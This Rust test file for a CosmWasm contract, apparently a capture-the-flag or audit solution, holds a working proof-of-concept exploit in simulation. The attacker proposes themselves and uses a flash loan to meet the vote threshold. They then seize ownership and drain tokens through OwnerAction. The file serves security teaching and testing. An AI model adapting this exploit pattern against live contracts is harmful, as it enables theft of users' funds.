#[cfg(test)]
pub mod tests {
    #[derive(Serialize, Debug)]
    enum UnifiedExecuteMsg {
        ExecuteMsg(ExecuteMsg),
        Cw20ExecuteMsg(Cw20ExecuteMsg),
    }

    use cosmwasm_std::{to_binary, Addr, CosmosMsg, Uint128, WasmMsg};
    use cw_multi_test::{App, Executor};
    use serde::Serialize;

    use crate::{
        integration_tests::tests::{base_scenario, ADMIN, VOTING_WINDOW},
        msg::{ExecuteMsg, QueryMsg},
        state::Config,
    };
    use cw20::Cw20ExecuteMsg;

    pub const ATTACKER: &str = "awesomwasm";

    #[test]
    fn exploit() {
        let (mut app, contract_addr, token_addr) = base_scenario();
        let amount = Uint128::new(50_001);

        // Attacker propose themselves
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // fast forward to the window closing
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // Takes FL and sends enough tokens to the contract
        let msgs = vec![
            (
                token_addr.clone(),
                UnifiedExecuteMsg::Cw20ExecuteMsg(Cw20ExecuteMsg::Transfer {
                    recipient: contract_addr.to_string(),
                    amount,
                }),
            ),
            (
                contract_addr.clone(),
                UnifiedExecuteMsg::ExecuteMsg(ExecuteMsg::ResolveProposal {}),
            ),
            (
                contract_addr.clone(),
                UnifiedExecuteMsg::ExecuteMsg(ExecuteMsg::OwnerAction {
                    action: CosmosMsg::Wasm(WasmMsg::Execute {
                        contract_addr: token_addr.to_string(),
                        msg: to_binary(&Cw20ExecuteMsg::Transfer {
                            recipient: ATTACKER.to_string(),
                            amount,
                        })
                        .unwrap(),
                        funds: vec![],
                    }),
                }),
            ),
            (
                token_addr.clone(),
                UnifiedExecuteMsg::Cw20ExecuteMsg(Cw20ExecuteMsg::IncreaseAllowance {
                    spender: ADMIN.to_string(),
                    amount,
                    expires: None,
                }),
            ),
        ];

        app = helper_take_fl(amount, msgs, ATTACKER.to_string(), app, token_addr);

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.owner, ATTACKER.to_string());
    }

    /// Takes FL and sends enough tokens to the contract, msgs should include increase allowance!
    fn helper_take_fl(
        amount: Uint128,
        msgs: Vec<(Addr, UnifiedExecuteMsg)>,
        sender: String,
        mut app: App,
        token_addr: Addr,
    ) -> App {
        // Mint tokens to the sender
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: sender.clone(),
                amount: Uint128::new(amount.u128()),
            },
            &[],
        )
        .unwrap();

        // Execute the msgs
        for msg in msgs {
            match msg.1 {
                UnifiedExecuteMsg::ExecuteMsg(emsg) => {
                    app.execute_contract(Addr::unchecked(sender.clone()), msg.0, &emsg, &[])
                        .unwrap();
                }
                UnifiedExecuteMsg::Cw20ExecuteMsg(cw20emsg) => {
                    app.execute_contract(Addr::unchecked(sender.clone()), msg.0, &cw20emsg, &[])
                        .unwrap();
                }
            }
        }

        // Send tokens back
        app.execute_contract(
            Addr::unchecked(ADMIN.clone()),
            token_addr,
            &Cw20ExecuteMsg::TransferFrom {
                owner: sender,
                recipient: ADMIN.to_string(),
                amount,
            },
            &[],
        )
        .unwrap();

        app
    }
}
